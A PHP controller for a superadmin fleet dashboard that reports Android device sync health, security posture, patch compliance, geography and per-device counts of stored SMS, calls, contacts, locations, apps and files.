<?php

namespace App\Controllers\superadmin;

class FleetController extends BaseSuperadminController
{
    public function index(string $tab = 'home')
    {
        $db = $this->getDb();

        // Get all device profiles with latest extraction per device
        $devices = $this->getLatestDeviceProfiles();

        // Calculate metrics from deduplicated devices
        $totalDevices = count($devices);
        $activeDevices = $this->countActiveDevices($devices);
        $staleDevices = $totalDevices - $activeDevices;

        // Uploaded data stats (server-side)
        $uploadedData = $this->getUploadedDataStats();

        // Device health metrics
        $healthStats = $this->getHealthStats();

        // Security metrics
        $securityStats = $this->getSecurityStats();

        // Device type breakdown
        $deviceTypes = $this->getDeviceTypeStats($devices);

        // User fleet summary
        $userFleet = $this->getUserFleetStats($devices);

        // Sync timeline (last 7 days)
        $syncTimeline = $this->getSyncTimeline();

        // Alerts
        $alerts = $this->getAlerts($devices);

        return $this->renderView('superadmin/fleet/index', [
            'pag' => 'superadmin-fleet',
            'active_tab' => $tab,
            'total_devices' => $totalDevices,
            'active_devices' => $activeDevices,
            'stale_devices' => $staleDevices,
            'uploaded_data' => $uploadedData,
            'health_stats' => $healthStats,
            'security_stats' => $securityStats,
            'device_types' => $deviceTypes,
            'user_fleet' => $userFleet,
            'sync_timeline' => $syncTimeline,
            'alerts' => $alerts,
        ]);
    }

    // ================================================================
    // DATA QUALITY METHODS - FIXED
    // ================================================================

    private function getLatestDeviceProfiles(): array
    {
        $db = $this->getDb();

        // Get latest extraction per device_id (deduplication)
        // Use a simpler approach: get max timestamp per device, then fetch matching rows
        $latestTimestamps = $db->table('tbl_device_profile')
            ->select('device_id, MAX(extraction_timestamp) as max_ts')
            ->groupBy('device_id')
            ->get()
            ->getResultArray();

        if (empty($latestTimestamps)) {
            return [];
        }

        // Build where conditions for each device_id + max_ts pair
        $devices = [];
        foreach ($latestTimestamps as $lt) {
            $device = $db->table('tbl_device_profile')
                ->where('device_id', $lt['device_id'])
                ->where('extraction_timestamp', $lt['max_ts'])
                ->where('device_id IS NOT NULL')
                ->limit(1)
                ->get()
                ->getRowArray();
            if ($device) {
                $devices[] = $device;
            }
        }

        return $devices;
    }

    private function countActiveDevices(array $devices): int
    {
        $now = time();
        $active = 0;

        foreach ($devices as $device) {
            $ts = $this->parseTimestamp($device['extraction_timestamp'] ?? '');
            if ($ts && ($now - $ts) < 86400) { // 24 hours
                $active++;
            }
        }
        return $active;
    }

    private function parseTimestamp($value): ?int
    {
        if (empty($value)) {
            return null;
        }

        // Handle string "2026" format
        if (is_string($value) && preg_match('/^\d{4}$/', $value)) {
            return strtotime($value . '-01-01');
        }

        // Handle epoch milliseconds (13 digits) or seconds (10 digits)
        $num = (int) $value;
        if ($num > 10000000000) {
            return (int) ($num / 1000); // milliseconds to seconds
        }
        if ($num > 1000000000) {
            return $num; // already seconds
        }

        return null;
    }

    // ================================================================
    // METRICS METHODS
    // ================================================================

    private function getUploadedDataStats(): array
    {
        $db = $this->getDb();

        $filesSize = $db->table('tbl_device_files')->selectSum('size_bytes')->get()->getRow()->size_bytes ?? 0;
        $appsSize = $db->table('tbl_apps')->selectSum('app_size')->get()->getRow()->app_size ?? 0;
        $totalBytes = $filesSize + $appsSize;

        return [
            'files_mb' => round($filesSize / (1024 * 1024), 1),
            'apps_mb' => round($appsSize / (1024 * 1024), 1),
            'total_mb' => round($totalBytes / (1024 * 1024), 1),
        ];
    }

    private function getHealthStats(): array
    {
        $db = $this->getDb();

        // Sync success rate (last 24h)
        $queueStats = $db->table('upload_queue')
            ->select("
                COUNT(*) as total,
                SUM(CASE WHEN status = 'completed' THEN 1 ELSE 0 END) as success,
                SUM(CASE WHEN status = 'failed' THEN 1 ELSE 0 END) as failed,
                SUM(CASE WHEN status = 'pending' THEN 1 ELSE 0 END) as pending
            ")
            ->where('queued_at >= DATE_SUB(NOW(), INTERVAL 24 HOUR)')
            ->get()
            ->getRowArray();

        $successRate = $queueStats['total'] > 0
            ? round(($queueStats['success'] / $queueStats['total']) * 100, 1)
            : 100;

        // Failed uploads count
        $failedCount = $db->table('upload_queue')
            ->where('status', 'failed')
            ->where('queued_at >= DATE_SUB(NOW(), INTERVAL 24 HOUR)')
            ->countAllResults();

        // Devices with low storage
        $lowStorage = $db->table('tbl_device_profile')
            ->where('internal_storage_free_gb <', 1)
            ->where('internal_storage_free_gb >', 0)
            ->countAllResults();

        // Battery health (average level)
        $avgBattery = $db->table('tbl_device_profile')
            ->selectAvg('battery_level')
            ->where('battery_level >', 0)
            ->get()
            ->getRow()
            ->battery_level ?? 0;

        return [
            'sync_success_rate' => $successRate,
            'failed_uploads_24h' => $failedCount,
            'pending_uploads' => $queueStats['pending'] ?? 0,
            'low_storage_devices' => $lowStorage,
            'avg_battery_level' => round($avgBattery, 1),
        ];
    }

    private function getSecurityStats(): array
    {
        $db = $this->getDb();

        $rooted = $db->table('tbl_device_profile')->where('is_rooted', 1)->countAllResults();
        $debuggable = $db->table('tbl_device_profile')->where('is_debuggable', 1)->countAllResults();

        // Sideloaded apps (not from Play Store)
        $sideloaded = $db->table('tbl_device_profile')
            ->where('app_installer !=', 'com.android.vending')
            ->where('app_installer !=', '')
            ->where('app_installer IS NOT NULL')
            ->countAllResults();

        // OS patch compliance (< 90 days)
        $patched = $db->table('tbl_device_profile')
            ->where('android_security_patch >=', date('Y-m-d', strtotime('-90 days')))
            ->where('android_security_patch !=', '')
            ->where('android_security_patch IS NOT NULL')
            ->countAllResults();

        $total = $this->getLatestDeviceProfilesCount();

        return [
            'rooted_devices' => $rooted,
            'debuggable_devices' => $debuggable,
            'sideloaded_apps' => $sideloaded,
            'patched_devices' => $patched,
            'patch_compliance_rate' => $total > 0 ? round(($patched / $total) * 100, 1) : 100,
        ];
    }

    private function getLatestDeviceProfilesCount(): int
    {
        $db = $this->getDb();
        return $db->table('tbl_device_profile')
            ->select('COUNT(DISTINCT device_id) as cnt')
            ->get()
            ->getRow()
            ->cnt ?? 0;
    }

    private function getDeviceTypeStats(array $devices): array
    {
        $stats = [
            'android_versions' => [],
            'brands' => [],
            'models' => [],
        ];

        foreach ($devices as $device) {
            $android = $device['android_version'] ?? 'Unknown';
            $brand = $device['device_brand'] ?? 'Unknown';
            $model = $device['device_model'] ?? 'Unknown';

            $stats['android_versions'][$android] = ($stats['android_versions'][$android] ?? 0) + 1;
            $stats['brands'][$brand] = ($stats['brands'][$brand] ?? 0) + 1;
            $stats['models'][$model] = ($stats['models'][$model] ?? 0) + 1;
        }

        // Sort and limit
        foreach ($stats as &$arr) {
            arsort($arr);
            $arr = array_slice($arr, 0, 10, true);
        }

        return $stats;
    }

    private function getUserFleetStats(array $devices): array
    {
        $db = $this->getDb();

        $userDevices = [];
        foreach ($devices as $device) {
            $uid = $device['owner_id'] ?? 0;
            if ($uid === 0) {
                $uid = 'unlinked_' . $device['device_id'];
            }
            if (!isset($userDevices[$uid])) {
                $userDevices[$uid] = [
                    'user_id' => $uid,
                    'devices' => 0,
                    'active' => 0,
                    'stale' => 0,
                ];
            }
            $userDevices[$uid]['devices']++;

            $ts = $this->parseTimestamp($device['extraction_timestamp'] ?? '');
            if ($ts && (time() - $ts) < 86400) {
                $userDevices[$uid]['active']++;
            } else {
                $userDevices[$uid]['stale']++;
            }
        }

        // Enrich with usernames for linked users
        $linkedIds = array_filter(array_keys($userDevices), function($k) { return is_numeric($k) && $k > 0; });
        $usernames = [];
        if ($linkedIds) {
            $rows = $db->table('users')
                ->select('id, username')
                ->whereIn('id', $linkedIds)
                ->get()
                ->getResultArray();
            foreach ($rows as $r) {
                $usernames[$r['id']] = $r['username'];
            }
        }

        $result = [];
        foreach ($userDevices as $uid => $data) {
            $data['username'] = $usernames[$uid] ?? ($uid === (int)$uid ? 'User #' . $uid : 'Unlinked Device');
            $result[] = $data;
        }

        usort($result, fn($a, $b) => $b['devices'] - $a['devices']);

        return array_slice($result, 0, 20);
    }

    private function getSyncTimeline(): array
    {
        $db = $this->getDb();

        $daily = $db->table('tbl_device_profile')
            ->select("DATE(FROM_UNIXTIME(extraction_timestamp / 1000)) as date, COUNT(DISTINCT device_id) as syncs")
            ->where('extraction_timestamp >', (time() - 604800) * 1000) // last 7 days in ms
            ->groupBy('DATE(FROM_UNIXTIME(extraction_timestamp / 1000))')
            ->orderBy('date', 'ASC')
            ->get()
            ->getResultArray();

        // Fill missing days
        $filled = [];
        for ($i = 6; $i >= 0; $i--) {
            $date = date('Y-m-d', strtotime("-$i days"));
            $filled[$date] = 0;
        }
        foreach ($daily as $row) {
            if (isset($filled[$row['date']])) {
                $filled[$row['date']] = (int) $row['syncs'];
            }
        }

        return $filled;
    }

    private function getAlerts(array $devices): array
    {
        $alerts = [];

        // Stale devices
        $staleCount = 0;
        foreach ($devices as $device) {
            $ts = $this->parseTimestamp($device['extraction_timestamp'] ?? '');
            if (!$ts || (time() - $ts) > 86400) {
                $staleCount++;
            }
        }
        if ($staleCount > 0) {
            $alerts[] = [
                'type' => 'warning',
                'title' => 'Stale Devices',
                'message' => "$staleCount devices haven't synced in 24+ hours",
                'route' => 'superadmin-fleet-alerts',
            ];
        }

        // Rooted devices
        $rooted = array_filter($devices, fn($d) => $d['is_rooted'] ?? 0);
        if (count($rooted) > 0) {
            $alerts[] = [
                'type' => 'danger',
                'title' => 'Rooted Devices Detected',
                'message' => count($rooted) . ' devices are rooted',
                'route' => 'superadmin-fleet-security',
            ];
        }

        // Low storage
        $lowStorage = array_filter($devices, fn($d) => ($d['internal_storage_free_gb'] ?? 0) > 0 && $d['internal_storage_free_gb'] < 1);
        if (count($lowStorage) > 0) {
            $alerts[] = [
                'type' => 'warning',
                'title' => 'Low Storage',
                'message' => count($lowStorage) . ' devices have < 1GB free space',
                'route' => 'superadmin-fleet-storage',
            ];
        }

        // Outdated OS patches
        $outdated = array_filter($devices, function($d) {
            $patch = $d['android_security_patch'] ?? '';
            return !empty($patch) && strtotime($patch) < strtotime('-90 days');
        });
        if (count($outdated) > 0) {
            $alerts[] = [
                'type' => 'info',
                'title' => 'Outdated Security Patches',
                'message' => count($outdated) . ' devices have patches older than 90 days',
                'route' => 'superadmin-fleet-patches',
            ];
        }

        return $alerts;
    }

    // ================================================================
    // SUB-PAGE METHODS
    // ================================================================

    public function timeline()
    {
        $db = $this->getDb();

        // Hourly heatmap for last 7 days
        $hourly = $db->table('tbl_device_profile')
            ->select("
                HOUR(FROM_UNIXTIME(extraction_timestamp / 1000)) as hour,
                DATE(FROM_UNIXTIME(extraction_timestamp / 1000)) as date,
                COUNT(DISTINCT device_id) as syncs
            ")
            ->where('extraction_timestamp >', (time() - 604800) * 1000)
            ->groupBy('date', 'hour')
            ->orderBy('date', 'ASC')
            ->orderBy('hour', 'ASC')
            ->get()
            ->getResultArray();

        // Daily totals
        $daily = $this->getSyncTimeline();

        return $this->renderView('superadmin/fleet/timeline', [
            'pag' => 'superadmin-fleet-timeline',
            'hourly_heatmap' => $hourly,
            'daily_totals' => $this->getSyncTimeline(),
        ]);
    }

    public function patches()
    {
        $db = $this->getDb();

        $devices = $this->getLatestDeviceProfiles();

        $patchData = [];
        foreach ($devices as $device) {
            $patch = $device['android_security_patch'] ?? '';
            $patchDate = !empty($patch) ? strtotime($patch) : 0;
            $daysOld = $patchDate ? (time() - $patchDate) / 86400 : null;

            $patchData[] = [
                'device_id' => $device['device_id'],
                'owner_id' => $device['owner_id'] ?? 0,
                'android_version' => $device['android_version'] ?? 'Unknown',
                'patch_date' => $patch ?: 'Unknown',
                'days_old' => $daysOld ? round($daysOld) : null,
                'compliant' => $patchDate && $daysOld <= 90,
            ];
        }

        usort($patchData, fn($a, $b) => ($a['days_old'] ?? 99999) - ($b['days_old'] ?? 99999));

        $compliant = array_filter($patchData, fn($d) => $d['compliant']);
        $nonCompliant = array_filter($patchData, fn($d) => !$d['compliant']);

        return $this->renderView('superadmin/fleet/patches', [
            'pag' => 'superadmin-fleet-patches',
            'all_patches' => $patchData,
            'compliant_count' => count($compliant),
            'non_compliant_count' => count($nonCompliant),
            'total_devices' => count($patchData),
        ]);
    }

    public function alerts()
    {
        $devices = $this->getLatestDeviceProfiles();
        $alerts = $this->getAlerts($devices);

        // Add more detailed alerts
        $detailedAlerts = [];

        // Stale devices with details
        $stale = array_filter($devices, function($d) {
            $ts = $this->parseTimestamp($d['extraction_timestamp'] ?? '');
            return !$ts || (time() - $ts) > 86400;
        });
        foreach ($stale as $device) {
            $detailedAlerts[] = [
                'type' => 'stale',
                'severity' => 'warning',
                'device_id' => $device['device_id'],
                'message' => 'No sync in 24+ hours',
                'last_sync' => $device['extraction_timestamp'],
            ];
        }

        // Rooted devices
        $rooted = array_filter($devices, fn($d) => $d['is_rooted'] ?? 0);
        foreach ($rooted as $device) {
            $detailedAlerts[] = [
                'type' => 'security',
                'severity' => 'danger',
                'device_id' => $device['device_id'],
                'message' => 'Device is rooted',
            ];
        }

        // Low storage
        $lowStorage = array_filter($devices, fn($d) => ($d['internal_storage_free_gb'] ?? 0) > 0 && $d['internal_storage_free_gb'] < 1);
        foreach ($lowStorage as $device) {
            $detailedAlerts[] = [
                'type' => 'storage',
                'severity' => 'warning',
                'device_id' => $device['device_id'],
                'message' => 'Low storage: ' . round($device['internal_storage_free_gb'], 1) . 'GB free',
            ];
        }

        return $this->renderView('superadmin/fleet/alerts', [
            'pag' => 'superadmin-fleet-alerts',
            'summary_alerts' => $this->getAlerts($devices),
            'detailed_alerts' => $detailedAlerts,
        ]);
    }

    public function geo()
    {
        $db = $this->getDb();

        $countries = $db->table('tbl_device_profile')
            ->select('country, COUNT(DISTINCT device_id) as device_count')
            ->where('country IS NOT NULL')
            ->where('country !=', '')
            ->groupBy('country')
            ->orderBy('device_count', 'DESC')
            ->get()
            ->getResultArray();

        $carriers = $db->table('tbl_device_profile')
            ->select('network_operator, COUNT(DISTINCT device_id) as device_count')
            ->where('network_operator IS NOT NULL')
            ->where('network_operator !=', '')
            ->groupBy('network_operator')
            ->orderBy('device_count', 'DESC')
            ->limit(20)
            ->get()
            ->getResultArray();

        return $this->renderView('superadmin/fleet/geo', [
            'pag' => 'superadmin-fleet-geo',
            'countries' => $countries,
            'carriers' => $carriers,
        ]);
    }

    public function deviceDetail(string $deviceId)
    {
        $db = $this->getDb();

        $device = $db->table('tbl_device_profile')
            ->where('device_id', $deviceId)
            ->orderBy('extraction_timestamp', 'DESC')
            ->limit(1)
            ->get()
            ->getRowArray();

        if (!$device) {
            return redirect()->to('superadmin/fleet')->with('error', 'Device not found');
        }

        // Get upload history
        $uploads = $db->table('upload_queue')
            ->where('device_print_id', $deviceId)
            ->orderBy('queued_at', 'DESC')
            ->limit(50)
            ->get()
            ->getResultArray();

        // Get data counts
        $dataCounts = [
            'sms' => $db->table('tbl_sms')->where('device_id', $deviceId)->countAllResults(),
            'calls' => $db->table('tbl_logs')->where('device_id', $deviceId)->countAllResults(),
            'contacts' => $db->table('tbl_contacts')->where('device_id', $deviceId)->countAllResults(),
            'locations' => $db->table('tbl_location')->where('device_id', $deviceId)->countAllResults(),
            'apps' => $db->table('tbl_apps')->where('device_id', $deviceId)->countAllResults(),
            'files' => $db->table('tbl_device_files')->where('device_id', $deviceId)->countAllResults(),
        ];

        return $this->renderView('superadmin/fleet/device_detail', [
            'pag' => 'superadmin-fleet-device',
            'device' => $device,
            'uploads' => $uploads,
            'data_counts' => $dataCounts,
        ]);
    }
}